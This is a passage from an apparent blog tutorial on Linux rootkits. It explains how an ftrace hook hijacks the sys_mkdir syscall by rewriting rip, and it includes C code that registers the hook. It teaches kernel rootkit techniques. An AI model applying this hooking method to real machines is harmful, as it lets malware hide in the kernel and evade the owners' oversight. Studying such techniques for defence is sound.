+</code></pre></div><p>As mentioned above, <code>rip</code> is probably going to get modified, so we have to alert ftrace to this by setting the <code>FTRACE_OPS_FL_IP_MODIFY</code>. In order to set this flag, we also have to set the <code>FTRACE_OPS_FL_SAVE_REGS</code> flag which passes the <code>pt_regs</code> struct of the original syscall along to our hook. Lastly, we also need to turn <em>off</em> ftrace&rsquo;s built-in recursion protection, which is the reason for the <code>FTRACE_OPS_FL_RECURSION_SAFE</code> flag (by default this flag is <em>on</em>, so or&rsquo;ing back in effectively turns it off).</p>
+<blockquote>
+<p>Clearly, if ftrace&rsquo;s protection relies on saving the return address in <code>rip</code>, and we&rsquo;ve just told ftrace that we&rsquo;re going to be modifying <code>rip</code>, then it&rsquo;s protections are no good to us!</p>
+</blockquote>
+<p>The other we do when we set these flags is set the <code>ops.func</code> subfield to <code>fh_trace_thunk</code> - this is the callback that we mentioned earlier. Looking at this function, we see that all it&rsquo;s really doing is setting the <code>rip</code> register to point to <code>hook-&gt;function</code>. All that remains is ensure that this callback gets executed whenever <code>rip</code> contains the address of <code>sys_mkdir</code>.</p>
+<p>This is exactly what these last 2 functions do!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">err <span style="color:#f92672">=</span> ftrace_set_filter_ip(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops, hook<span style="color:#f92672">-&gt;</span>address, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(err)
+{
+    printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: ftrace_set_filter_ip() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+    <span style="color:#66d9ef">return</span> err;
+}
+
+err <span style="color:#f92672">=</span> register_ftrace_function(<span style="color:#f92672">&amp;</span>hook<span style="color:#f92672">-&gt;</span>ops);
+<span style="color:#66d9ef">if</span>(err)
+{
+    printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: register_ftrace_function() failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+    <span style="color:#66d9ef">return</span> err;
+}
+</code></pre></div><p><code>ftrace_set_filter_ip()</code> tells ftrace to only execute our callback when <code>rip</code> is the address of <code>sys_mkdir</code> (which was already saved in <code>hook-&gt;address</code> from earlier). Finally, we set the whole thing into motion by calling <code>register_ftrace_function()</code>. At this point, the function hook is in place!</p>
+<p>As you might imagine, when we unload the module and <code>rootkit_exit()</code> is called, <code>fh_remove_hooks()</code> does all of this back in reverse.</p>
+<p>You can see now why it&rsquo;s not really 100% needed to understand all of this to be able to write a syscall hook. The real challenge is to write the hook function itself - and there are still many problems that can be encountered along the way!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/linux_rootkits_01/">
+                <span class="button__text">Linux Rootkits Part 1: Introduction and Worflow</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Harvey Phillips 2020 - London, England</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
